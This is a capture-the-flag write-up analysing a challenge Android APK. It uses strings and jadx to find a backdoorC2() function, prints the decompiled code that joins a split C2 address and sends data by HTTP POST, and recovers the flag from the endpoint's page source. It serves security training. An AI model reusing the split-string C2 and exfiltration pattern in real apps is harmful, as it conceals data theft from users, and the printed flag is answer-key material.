<img width="596" height="706" alt="image" src="https://github.com/user-attachments/assets/c46aef2a-527b-4fc0-9cdc-0661db13c0ba" />

# 1. Initial Analysis

The provided file was an Android APK:

```
ProtonX1337.apk
```

The first step was to perform basic static analysis to identify any suspicious strings or network activity.

Using the `strings` utility:

```
strings ProtonX1337.apk |grep-iE"http|https"
```

However, this did not reveal any obvious C2 domains, suggesting the URL might be **constructed dynamically or obfuscated**.

---

# 2. Decompiling the APK

To properly analyze the application logic, the APK was decompiled using **jadx**:

```
jadx ProtonX1337.apk
```

The main logic was found in:

```
com/example/protonx1337/MainActivity.kt
```

Inside the `onCreate()` method, two functions are called:

```
initializeMediaStorage();
backdoorC2();
```

The suspicious function here is clearly `backdoorC2()`.

---

# 3. Investigating the Backdoor Function

The `backdoorC2()` function creates a background thread and prepares an HTTP request:

<img width="1430" height="560" alt="image" src="https://github.com/user-attachments/assets/1b76c34b-4128-4253-83cc-1f67b328c925" />

```
URLurl=newURL(d1+d2);
HttpURLConnectionconnection= (HttpURLConnection)url.openConnection();
connection.setRequestMethod("POST");
```

The server address is constructed from two variables:

```
Stringd1=LiveLiterals$MainActivityKt.INSTANCE.m5425x506ff06();
Stringd2=LiveLiterals$MainActivityKt.INSTANCE.m5426xcc12e607();
```

This indicates the **C2 server is intentionally split into multiple parts** to avoid detection.

---

# 4. Extracting the C2 Server

Inspecting the file:

```
LiveLiterals$MainActivityKt
```

revealed the hidden string values:

<img width="1371" height="200" alt="image" src="https://github.com/user-attachments/assets/a6f44cb5-e64d-4f00-b07b-497a4cc4d753" />

Combining them gives the full C2 URL:

```
https://appsecmy.com/pages/liga-ctf-2026
```

This is the **command and control (C2) endpoint** where the malware sends exfiltrated data.

---

# 5. Visiting the C2 Endpoint

Opening the URL in a browser:

```
https://appsecmy.com/pages/liga-ctf-2026
```

revealed a webpage related to **LIGA CTF 2026**.

Since the challenge hinted that **no scanning or brute forcing was required**, the next step was to inspect the **HTML source code**.

---

# 6. Inspecting the Page Source

Viewing the page source revealed a hidden comment near the bottom:

<img width="1919" height="619" alt="image" src="https://github.com/user-attachments/assets/a17debb7-0582-49ee-8bf9-52d4d9f610e6" />

```
<!-- HACK10{j3mpu7_s3r74_0W4SP_C7F} -->
```

This comment contains the challenge flag.

---

